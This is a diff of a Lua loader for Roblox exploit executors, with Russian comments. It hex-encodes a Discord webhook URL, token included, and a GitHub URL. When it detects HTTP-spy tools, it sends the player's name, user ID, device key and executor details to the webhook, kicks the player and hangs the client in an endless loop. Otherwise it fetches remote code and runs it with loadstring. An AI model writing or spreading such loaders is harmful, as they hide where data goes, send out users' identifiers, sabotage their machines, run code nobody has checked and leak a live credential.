@@ -4,21 +4,55 @@ local function _D(h)
     return s
 end
 
-local _AL = _D("68747470733A2F2F646973636F72642E636F6D2F6170692F776562686F6F6B732F313531383333343033353838383138313237312F733164313841767532456D57707A547254306A4E49686A543665314A3537595837304F58484D567878637975535377364C366E7242416A7756737067612D4C37534E4B4F")
-local _G = _D("68747470733A2F2F7261772E67697468756275736572636F6E74656E742E636F6D2F697473656173797270672F727067672F726566732F68656164732F6D61696E2F727067")
-
-local _L = game:GetService("Players").LocalPlayer
 local _req = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
+local _L = game:GetService("Players").LocalPlayer
 
-local function _SC()
+-- 1. УСИЛЕННЫЙ ДЕТЕКТ ШПИОНОВ
+local function _GET_SPY()
     if not _req then return false end
-    local ok, info = pcall(debug.getinfo, _req)
-    if ok and info and info.source ~= "=[C]" then return true end
-    for _, v in ipairs({"HttpSpy", "SimpleSpy", "VGG Spy", "HydroSpy", "TwiSpy"}) do if getgenv()[v] then return true end end
+    
+    -- Проверка на подмену функции (Hooking)
+    local info = debug.getinfo(_req)
+    if info.source ~= "=[C]" or info.what ~= "C" then return "HOOKED_REQ" end
+    
+    local hg_info = debug.getinfo(game.HttpGet)
+    if hg_info.source ~= "=[C]" then return "HOOKED_HTTP" end
+
+    -- Проверка на наличие шпионов в CoreGui
+    local cg = game:GetService("CoreGui")
+    if cg:FindFirstChild("SimpleSpy") or cg:FindFirstChild("HttpSpy") or cg:FindFirstChild("HydroSpy") then
+        return "SPY_GUI"
+    end
+
+    -- Проверка глобальных переменных шпионов
+    local spies = {"SimpleSpy", "HttpSpy", "HydroSpy", "VGG Spy", "TwiSpy", "Spy"}
+    for _, v in ipairs(spies) do
+        if getgenv()[v] then return "SPY_GENV" end
+    end
+
     return false
 end
 
-if _SC() then
+-- 2. СБОР ДАННЫХ ДЛЯ ЛОГОВ
+local _hw = game:GetService("RbxAnalyticsService"):GetClientId()
+local _tk = "N/A"
+pcall(function()
+    if isfile("nazarkus_key.json") then _tk = readfile("nazarkus_key.json")
+    else _tk = game:GetService("HttpService"):GenerateGUID(false) writefile("nazarkus_key.json", _tk) end
+end)
+
+local function _GUNC()
+    local u = 0
+    local tu = {"getgenv", "getrawmetatable", "hookmetamethod", "hookfunction", "setreadonly"}
+    for _, f in ipairs(tu) do if getgenv()[f] then u = u + 1 end end
+    return (identifyexecutor and identifyexecutor() or "Unknown") .. " (UNC: " .. math.floor((u/5)*100) .. "%)"
+end
+
+local _spy_err = _GET_SPY()
+
+if _spy_err then
+    -- ШПИОН ОБНАРУЖЕН: Шлем алерт и кикаем (Основной вебхук тут даже не упоминается)
+    local _AL = _D("68747470733A2F2F646973636F72642E636F6D2F6170692F776562686F6F6B732F313531383333343033353838383138313237312F733164313841767532456D57707A547254306A4E49686A543665314A3537595837304F58484D567878637975535377364C366E7242416A7756737067612D4C37534E4B4F")
     pcall(function()
         _req({
             Url = _AL,
@@ -26,26 +60,30 @@ if _SC() then
             Headers = {["Content-Type"] = "application/json"},
             Body = game:GetService("HttpService"):JSONEncode({
                 embeds = {{
-                    title = "🚨 Security Alert: Interceptor Detected",
-                    description = "User " .. _L.Name .. " tried to use HTTP Spy.",
+                    title = "🚨 Webhook Theft Attempt Blocked",
                     color = 16711680,
+                    description = "A user tried to spy on the loader. Detection: **" .. tostring(_spy_err) .. "**",
                     fields = {
                         {name = "Player", value = _L.Name .. " (" .. _L.UserId .. ")", inline = true},
-                        {name = "HWID", value = game:GetService("RbxAnalyticsService"):GetClientId(), inline = false}
+                        {name = "Device Key", value = "```" .. _tk .. "```", inline = false},
+                        {name = "Executor", value = _GUNC(), inline = true}
                     }
                 }}
             })
         })
     end)
-    _L:Kick("Loader Error: 0xSECURITY")
+    _L:Kick("Security Tamper Detected: " .. tostring(_spy_err))
+    while true do end
     return
 end
 
-getgenv()._NK_SIGNAL = "NAZARKUS_PRO_V9"
+-- ВСЁ ЧИСТО: Можно грузить основной скрипт
+getgenv()._NK_SIGNAL = "NAZARKUS_SECURE_AUTH_V8"
+local _G = _D("68747470733A2F2F7261772E67697468756275736572636F6E74656E742E636F6D2F697473656173797270672F727067672F726566732F68656164732F6D61696E2F727067")
 local ok, res = pcall(function() return game:HttpGet(_G) end)
 if ok and res then
     local f = loadstring(res)
     if f then task.spawn(f) end
 else
-    _L:Kick("Connection Fail. Try again later.")
+    _L:Kick("Connection Error 0x82")
 end
